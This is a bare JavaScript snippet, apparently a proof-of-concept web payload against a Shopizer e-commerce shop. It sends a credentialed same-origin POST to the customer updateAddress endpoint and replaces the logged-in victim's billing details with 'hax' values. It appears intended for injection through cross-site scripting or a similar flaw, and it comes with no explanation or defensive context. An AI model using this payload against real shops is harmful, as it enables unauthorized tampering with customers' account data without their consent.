fetch("http://shopizer:8080/shop/customer/updateAddress.html", {
    method: "POST",
    mode: "same-origin",
    credentials: "same-origin",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: "customerId=&billingAddress=false&firstName=hax&lastName=hax&company=&address=hax&city=hax&country=AL&stateProvince=z&postalCode=z&phone=z&submitAddress=Change address",
  });
  